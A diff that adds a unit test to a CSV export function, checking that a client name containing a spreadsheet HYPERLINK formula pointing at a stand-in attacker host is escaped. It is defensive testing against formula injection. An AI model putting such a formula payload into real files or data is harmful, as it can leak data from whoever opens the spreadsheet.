@@ -136,6 +136,20 @@ describe('buildAnalyticsCsv', () => {
     expect(csv).not.toContain(',agent,');
   });
 
+  it('neutralizes a formula hiding in a cliente name', () => {
+    // Client names are user input and reach the export through the ranking, so
+    // they run the same gauntlet the etapa names do. `=HYPERLINK` is the one
+    // that matters: it exfiltrates on open, with no macro prompt.
+    const csv = buildAnalyticsCsv(
+      payload(),
+      membros,
+      new Map([[1, '=HYPERLINK("http://evil.test","clique")']]),
+    );
+
+    expect(csv).toContain('"\'=HYPERLINK(""http://evil.test"",""clique"")"');
+    expect(csv).not.toContain('\n=HYPERLINK');
+  });
+
   it('names an unresolved cliente instead of leaking the id', () => {
     const csv = buildAnalyticsCsv(payload(), membros);
 
